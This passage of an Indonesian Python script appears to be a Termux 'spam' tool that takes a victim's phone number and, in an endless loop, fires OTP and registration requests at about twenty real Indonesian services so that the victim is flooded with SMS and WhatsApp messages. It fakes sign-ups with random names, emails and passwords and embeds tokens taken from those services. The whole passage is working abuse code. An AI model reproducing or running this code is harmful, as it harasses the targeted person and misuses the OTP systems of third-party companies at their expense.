    ]
)

def process_data1():
    sleep(0.10)
    
def spam_sms():
    global nomor 
    prints(Panel(f"""{H2}Masukan Nomor Target Yang Ingin Di Spam Contoh : +6281234567xxx""",width=80,padding=(0,6),style=f"{color_panel}"))
    nomor = console.input(f" {H2}• {P2}Masukan No +62 : ").replace("+62","")
    if nomor == "":
        pass
    else:
        while True:
            for _ in track(range(100), description=f' {H2}• {P2} Sedang Spam...'):process_data1()
            spam()

class sxp_sms:

    def __init__(self):
        self.req = requests.Session()
        self.main()

    def sms_otp_1(self, no):
        __req__ = self.req.post("https://service.mokapos.com/account/v1/verification/phone/send",
            headers = {
                  "accept": "application/json, text/plain, */*",
                  "authorization": "undefined",
                  "save-data": "on",
                  "user-agent": agent,
                  "content-type": "application/json;charset=UTF-8"
                },
            json = {
                 "phone_number": f"+62{no}"
              }
        ).text

    def sms_otp_2(self, no):
        data = json.dumps({
                    "mobile": f"0{no}",
                    "noise": "1583590641573155574",
                    "request_time": "158359064157312",
                    "access_token": "11111"
                   })
        __req__ = self.req.post("https://apiservice.rupiahcepatweb.com/webapi/v1/request_login_register_auth_code",
            headers = {
                    "accept": "text/html, application/xhtml+xml, application/json, */*",
                    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                    "content-length": "166",
                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "origin": "https://h5.rupiahcepatweb.com",
                    "referer": "https://h5.rupiahcepatweb.com/dua2/pages/openPacket/openPacket.html?activityId=11&invite=200219190100215723",
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-site",
                    "user-agent": agent
                  },
            data = {
                 "data": data
               }
        ).text

    def sms_otp_3(self, no):
        __req__ = self.req.post("https://www.olx.co.id/api/auth/authenticate",
            headers = {
                    "accept": "*/*",
                    "x-newrelic-id": "VQMGU1ZVDxABU1lbBgMDUlI=",
                    "x-panamera-fingerprint": "83b09e49653c37fb4dc38423d82d74d7#1597271158063",
                    "user-agent": agent,
                    "content-type": "application/json"
                  },
            json = {
                 "grantType": "retry",
                 "method": "sms",
                 "phone": no,
                 "language": "id"
                }
        ).text

    def sms_otp_4(self, no):
        __req__ = self.req.post("https://www.alodokter.com/login-with-phone-number",
            headers = {
                    "user-agent": agent,
                    "content-type": "application/json",
                    "referer": "https://www.alodokter.com/login-alodokter",
                    "accept": "application/json",
                    "origin": "https://www.alodokter.com"
                  },
            json = {
                 "user":{
                      "phone": f"0{no}"
                    }
                }
        ).text

    def sms_otp_5(self, no):
        __req__ = self.req.post("https://www.kelaspintar.id/user/otpverification",
            headers = {
                    "x-requested-with": "XMLHttpRequest",
                    "user-agent": agent,
                    "Referer": "https://www.kelaspintar.id/"
                  },
            data = {
                 "user_mobile": no,
                 "otp_type": "send_otp_reg",
                 "mobile_code": "%2B62"
                }
        ).text

    def sms_otp_6(self, no):
        aink_sanz = random.choice(
                        [
                            "Hallo Mantan",
                            "Hallo Bangsad",
                            "Hallo Sayang",
                            "Hallo Ripper",
                            "Hallo Ngab"
                        ]
                    )
        email = random.choice(
                    [
                        "nsnsmsmksksmsm@gmail.com",
                        "lavon.lockman@gmail.com",
                        "duane_mclaughlin38@gmail.com",
                        "alfreda.lindgren@gmail.com",
                        "leonardo_kuhlman@gmail.com",
                        "lyric51@gmail.com",
                        "devonte_littel@gmail.com",
                        "newell.kuhic@gmail.com"
                    ]
                )
        pw = random.choice(
                    [
                        "mamsmms123",
                        "Wadepak1037",
                        "waifugw1011"
                    ]
                )
        birth_date = random.choice(
                        [
                            "13/09/1999",
                            "04/02/2022",
                            "05/02/2022",
                            "05/02/2022",
                            "06/02/2022",
                            "10/02/2022"
                        ]
    )
        __req__ = self.req.post("https://www.matahari.com/rest/V1/thorCustomers",
            json = {
                "thor_customer":{
                        "name": aink_sanz,
                        "card_number": None,
                        "email_address": email,
                        "mobile_country_code": "+62",
                        "gender_id": "1",
                        "mobile_number": f"0{no}",
                        "mro": "",
                        "password": pw,
                        "birth_date": birth_date
                        }
                },
            headers = {
                    "Host": "www.matahari.com",
                    "x-newrelic-id": "Vg4GVFVXDxAGVVlVBgcGVlY=",
                    "origin": "https://www.matahari.com",
                    "user-agent": agent,
                    "content-type": "application/json",
                    "accept": "*/*",
                    "x-requested-with": "XMLHttpRequest",
                    "referer": "https://www.matahari.com/customer/account/create/",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
                }

        ).text

    def sms_otp_7(self, no):
        __req__ = self.req.post("https://api.duniagames.co.id/api/user/api/v2/user/send-otp",
            headers = {
                    "Host": "api.duniagames.co.id",
                    "content-length": "32",
                    "accept": "application/json, text/plain, */*",
                    "x-device": "cc45ed83-73bd-4a98-83e3-874e8bc11a7f",
                    "accept-language": "id",
                    "user-agent": agent,
                    "ciam-type": "FR",
                    "content-type": "application/json",
                    "origin": "https://duniagames.co.id",
                    "sec-fetch-site": "same-site",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-dest": "empty",
                    "referer": "https://duniagames.co.id/",
                    "accept-encoding": "gzip, deflate, br"
                  },
            json = {
                 "phoneNumber": f"+62{no}"
                }
        ).text

    def sms_otp_8(self, no):
        __req__ = self.req.post("https://harvestcakes.com/register",
            headers = {
                    "user-agent": agent,
                    "Referer": "https://harvestcakes.com/register"
                  },
            data = {
                 "phone": f"0{no}",
                 "url": ""
                }
        ).text

    def sms_otp_9(self, no):
        __req__ = self.req.post("https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id",
            headers = {
                    "Host": "identity-gateway.oyorooms.com",
                    "consumer_host": "https://www.oyorooms.com",
                    "accept-language": "id",
                    "access_token": "SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=",
                    "user-agent": agent,
                    "Content-Type": "application/json",
                    "accept": "*/*",
                    "origin": "https://www.oyorooms.com",
                    "referer": "https://www.oyorooms.com/login",
                    "Accept-Encoding": "gzip, deflate, br"
                  },
            json = {
                 "phone": f"0{no}",
                 "country_code": "+62",
                 "country_iso_code": "ID",
                 "nod": "4",
                 "send_otp": "true",
                 "devise_role": "Consumer_Guest"
                }
        ).text

    def sms_otp_10(self, no):
        __req__ = self.req.post("https://crp-app.stamps.co.id/api/auth/validate-mobile-number",
            json = {
                "mobile_number": f"0{no}",
                "token": "sI01tF5bOSYHabS7HaXiB1k3j0JxFxbcQ79Rd1HFBjKEKJqYAwSNMScsx9AEZq3O"
                },
            headers = {
                    "Host": "crp-app.stamps.co.id",
                    "content-type": "application/json; charset=utf-8",
                    "content-length": "106",
                    "accept-encoding": "gzip",
                    "User-Agent": agent
            }
        ).text

    def sms_otp_11(self, no):
        __req__ = self.req.post("https://app-api.kredito.id/client/v1/common/verify-code/send",
            headers = {
                    "LPR-TIMESTAMP": "1603281035821",
                    "Accept-Language": "id-ID",
                    "LPR-BRAND": "Kredito",
                    "LPR-PLATFORM": "android",
                    "user-agent": agent,
                    "Authorization": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOi0xNjAzMjgxMDE3MjAzLCJ1dHlwZSI6ImFub24iLCJleHAiOjE2MDMyODQ2MTd9._HUnW7FQmMiDWvSejS0MBqMq95l2rk_6PuxDeXY5Oks",
                    "LPR-SIGNATURE": "e15dbea8602409df32a2ed5a123dc244",
                    "Content-Type": "application/json; charset=UTF-8",
                    "Content-Length": "79"
                   },
            data = '{"event":"default_verification","mobilePhone":"%s","sender":"jatissms"}' % no
        ).text

    def sms_otp_12(self, no):
        __req__ = self.req.post("https://www.autofun.co.id:443/v2/captcha/sms",
            headers = {
                    "Host": "www.autofun.co.id",
                    "Connection": "keep-alive",
                    "Content-length": "84",
                    "accept": "*/*",
                    "user-agent": agent,
                    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                    "content-type": "application/json;charset=UTF-8",
                    "Origin": "https://www.autofun.co.id",
                    "X-Requested-With": "acr.browser.barebones",
                    "Sec-Fetch-Site": "same-origin",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Dest": "empty",
                    "Referer": "https://www.autofun.co.id/mobil/datsun",
                    "Accept-Encoding": "gzip, deflate"
                },
            json = {
                    "phoneNum": f"62{no}",
                    "languageCode": "id-id",
                    "countryCode": "id",
                    "platform": 2
            }
        ).text

    def sms_otp_13(self, no):
        __req__ = self.req.post("https://api.myfave.com/api/fave/v3/auth",
            json = {
                    "phone":"+62"+no
                },
            headers = {
                    "Host": "api.myfave.com",
                    "Connection": "keep-alive",
                    "x-user-agent": "Fave-PWA/v1.0.0",
                    "Origin": "https://m.myfave.com",
                    "user-agent": agent,
                    "content-type": "application/json",
                    "Accept": "*/*",
                    "Referer": "https://m.myfave.com/jakarta/auth",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
            }
        ).text

    def sms_otp_14(self, no):
        nickname = random.choice(
                      [
                        "fahmi",
                        "xzc0der",
                        "bed3bah",
                        "xmanz"
                      ]
                    )
        angka = random.randint(
                    111,
                    999
                      )
        __req__ = self.req.post("https://wong.kitabisa.com/register/draft",
            headers = {
                    "Host": "wong.kitabisa.com",
                    "x-ktbs-platform-name": "pwa",
                    "origin": "https://account.kitabisa.com",
                    "x-ktbs-time": "1611020248",
                    "user-agent": agent,
                    "x-ktbs-api-version": "1.0.0",
                    "accept": "application/json",
                    "x-ktbs-client-name": "kanvas",
                    "x-ktbs-request-id": "107790c3-86e0-4872-9dfb-b9c5da9bfa13",
                    "x-ktbs-client-version": "1.0.0",
                    "x-ktbs-signature": "e6b4dd627125b3ccd53de193d165c481cc7fdfef0b1dcd7a587636a008fdc89e",
                    "version": "3.4.0",
                    "referer": "https://account.kitabisa.com/register/otp?type=sms",
                    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
                  },
            json = {
                 "full_name": nickname+str(angka),
                 "username": f"62{no}",
                 "otp_type": "sms"
                }
        ).text

    def main(self):
        self.sms_otp_1(nomor)
        self.sms_otp_2(nomor)
        self.sms_otp_3(nomor)
        self.sms_otp_4(nomor)
        self.sms_otp_5(nomor)
        self.sms_otp_6(nomor)
        self.sms_otp_7(nomor)
        self.sms_otp_8(nomor)
        self.sms_otp_9(nomor)
        self.sms_otp_10(nomor)
        self.sms_otp_11(nomor)
        self.sms_otp_12(nomor)
        self.sms_otp_13(nomor)
        self.sms_otp_14(nomor)
        cetak(panel(f"Sukses Spam SMS Ke No : +62{nomor}",width=90,padding=(0,2),style=f"bold white"))

#------------------[ DEFF SPAM WA ]-------------------# 
    
def spam_wa():
    global nomor
    cetak(panel(f'''   Masukan Nomor Target Yang Ingin Di Spam Contoh : +6281234567xxx''',width=90,padding=(0,8),style=f"bold white"))
    nomor = input(f" [+] Input No Hp : +62").replace("+62","")
    if nomor == "":
        pass
    else:
        while True:
            for _ in track(range(100), description=f' [+] Sedang Spam...'):process_data1()
            sxp_wa()
            
class sxp_wa:

    def __init__(self):
        self.req = requests.Session()
        self.main()

    def wa_otp_1(self, no):
        nickname = random.choice(
                      [
                        "fahmi",
                        "xzc0der",
                        "bed3bah",
                        "xmanz"
                      ]
                     )
        angka = random.randint(
                    111,
                    999
                       )
        __req__ = self.req.post("https://wong.kitabisa.com/register/draft",
            headers = {
                    "Host": "wong.kitabisa.com",
                    "x-ktbs-platform-name": "pwa",
                    "origin": "https://account.kitabisa.com",
                    "x-ktbs-time": "1611020248",
                    "user-agent": agent,
                    "x-ktbs-api-version": "1.0.0",
                    "accept": "application/json",
                    "x-ktbs-client-name": "kanvas",
                    "x-ktbs-request-id": "107790c3-86e0-4872-9dfb-b9c5da9bfa13",
                    "x-ktbs-client-version": "1.0.0",
                    "x-ktbs-signature": "e6b4dd627125b3ccd53de193d165c481cc7fdfef0b1dcd7a587636a008fdc89e",
                    "version": "3.4.0",
                    "referer": "https://account.kitabisa.com/register/otp?type=sms",
                    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
                   },
            json = {
                 "full_name": nickname+str(angka),
                 "username": f"0{no}",
                 "otp_type": "whatsapp"
                }
        ).text

    def wa_otp_2(self, no):
        __req__ = self.req.get(
            f"https://m.redbus.id/api/getOtp?number={no}&cc=62&whatsAppOpted=true"
        ).text

    def wa_otp_3(self, no):
        __req__ = self.req.post("https://api.bukuwarung.com/api/v1/auth/otp/send",
            headers = {
                    "Accept": "application/json",
                    "X-APP-VERSION-NAME": "3.4.0",
                    "X-APP-VERSION-CODE": "3399",
                    "Content-Type": "application/json; charset=UTF-8",
                    "Host": "api.bukuwarung.com",
                    "Connection": "Keep-Alive",
                    "Accept-Encoding": "gzip",
                    "User-Agent": agent
                   },
            json = {
                 "action": "LOGIN_OTP",
                 "countryCode": "62",
                 "deviceId": "00000177-142d-f1a2-bac4-57a9039fdc4d",
                 "method": "WA",
                 "phone": no
                }
        ).text

    def wa_otp_4(self, no):
        __req__ = self.req.post("https://evermos.com/api/client/request-code",
            headers = {
                    "user-agent": agent
                  },
            data = {
                 "telephone": f"62{no}",
                 "type": 0
                }
        ).text

    def wa_otp_5(self, no):
        __req__ = self.req.post("https://wapi.ruparupa.com/auth/generate-otp",
            headers = {
                    "Host": "wapi.ruparupa.com",
                    "Connection": "keep-alive",
                    "Authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiOGZlY2VjZmYtZTQ1Zi00MTVmLWI2M2UtMmJiMzUyZmQ2NzhkIiwiaWF0IjoxNTkzMDIyNDkyLCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.fETKXQ0KyZdksWWsjkRpjiKLrJtZWmtogKyePycoF0E",
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "X-Company-Name": "odi",
                    "user-agent": agent,
                    "user-platform": "mobile",
                    "X-Frontend-Type": "mobile",
                    "Origin": "https://m.ruparupa.com",
                    "Referer": "https://m.ruparupa.com/verification?page=otp-choices",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
                   },
            json = {
                 "phone": f"0{no}",
                 "action": "register",
                 "channel": "chat",
                 "email": "",
                 "customer_id": "0",
                 "is_resend": 0
                }
        ).text

    def wa_otp_6(self, no):
        headers = {
                "Connection": "keep-alive",
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "Origin": "https://accounts.tokopedia.com",
                "X-Requested-With": "XMLHttpRequest",
                "user-agent": agent,
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "Accept-Encoding": "gzip, deflate",
               }
        site = self.req.get("https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn="+ no +"&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D", headers = headers).text
        search = re.search(r'\<input\ id\=\"Token\"\ value\=\"(.*?)\"\ type\=\"hidden\"\>', site).group(1)
        data = {
             "otp_type": "116",
             "msisdn": no,
             "tk": search,
             "email": "",
             "original_param": "",
             "user_id": "",
             "signature": "",
             "number_otp_digit": "6",
            }
        __req__ = self.req.post(
                "https://accounts.tokopedia.com/otp/c/ajax/request-wa", headers = headers, data = data
       ).text

    def main(self):
        self.wa_otp_1(nomor)
        self.wa_otp_2(nomor)
        self.wa_otp_3(nomor)
        self.wa_otp_4(nomor)
        self.wa_otp_5(nomor)
        self.wa_otp_6(nomor)
        cetak(panel(f" Sukses Spam WA Ke No : +62{nomor}",width=90,padding=(0,2),style=f"bold white"))


#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
    try:os.system('git pull')
    except:pass
    try:os.mkdir('/sdcard/RUDAL-DUMP')
    except:pass
    try:os.mkdir('OK')
    except:pass
    try:os.system('pkg install play-audio')
    except:pass
    try:os.mkdir('/sdcard/FilePayload')
    except:pass
    try:os.mkdir('CP')
    except:pass
    try:os.mkdir('data')
    except:pass
    try:os.system('touch .prox.txt')
    except:pass
    try:os.system('clear')
    except:pass
    login()
